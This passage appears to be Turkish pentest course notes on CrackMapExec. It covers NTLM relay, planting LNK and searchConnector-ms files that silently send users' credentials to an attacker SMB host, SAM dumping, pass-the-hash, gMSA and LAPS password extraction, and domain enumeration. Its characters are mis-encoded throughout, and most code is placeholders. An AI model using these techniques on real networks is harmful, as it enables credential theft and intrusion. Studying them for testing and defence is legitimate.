DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

